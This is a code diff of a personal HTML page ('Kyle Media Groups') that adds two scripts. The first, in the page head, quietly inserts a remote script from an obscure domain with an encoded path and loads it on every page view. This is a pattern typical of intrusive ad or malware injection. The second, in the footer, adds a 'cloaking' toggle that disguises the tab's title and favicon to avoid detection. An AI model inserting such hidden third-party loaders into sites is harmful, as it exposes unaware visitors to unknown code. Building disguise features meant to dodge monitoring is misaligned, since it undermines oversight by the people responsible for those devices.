@@ -2,6 +2,18 @@
 <html lang="en">
 
 <head>
+    <script>
+        (function(wnkpc){
+        var d = document,
+            s = d.createElement('script'),
+            l = d.scripts[d.scripts.length - 1];
+        s.settings = wnkpc || {};
+        s.src = "\/\/pushyconsequence.com\/bNXDVis.d\/Gtlr0OYTWMcw\/BeKmx9JuMZmUHlgkaPvTZUG3LMvTugYx\/MYzSMUtMNNTGcTxhO_D\/ESzSNcAl";
+        s.async = true;
+        s.referrerPolicy = 'no-referrer-when-downgrade';
+        l.parentNode.insertBefore(s, l);
+        })({})
+        </script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
@@ -103,6 +115,34 @@
     <footer>
         <p>Made By: Kyle Speight | Find my linktree<a href="https://linktr.ee/kylespeight"><button class="b-1">Here</button></a></p>
     </footer>
+    <button class="floating-button" id="toggleCloakingButton" onclick="toggleCloaking()">Toggle Cloaking: On</button>
+    <script>
+        let cloakingEnabled = true; // Flag to track cloaking status
+
+        function toggleCloaking() {
+            cloakingEnabled = !cloakingEnabled; // Toggle the flag
+            const button = document.getElementById('toggleCloakingButton');
+
+            if (cloakingEnabled) {
+                setRandomFaviconAndTitle(); // Call the function if enabled
+                button.innerText = "Toggle Cloaking: On"; // Update button text
+            } else {
+                // Optionally, reset to a default favicon and title
+                document.title = "Kyle Media Groups"; // Default title
+                const defaultFavicon = 'https://thebombgamer.github.io/img/favicon1.ico'; // Default favicon
+                const link = document.querySelector('link[rel="icon"]');
+                if (link) {
+                    link.href = defaultFavicon;
+                } else {
+                    const newLink = document.createElement('link');
+                    newLink.rel = 'icon';
+                    newLink.href = defaultFavicon;
+                    document.head.appendChild(newLink);
+                }
+                button.innerText = "Toggle Cloaking: Off"; // Update button text
+            }
+        }
+    </script>
 </body>
 
 </html>
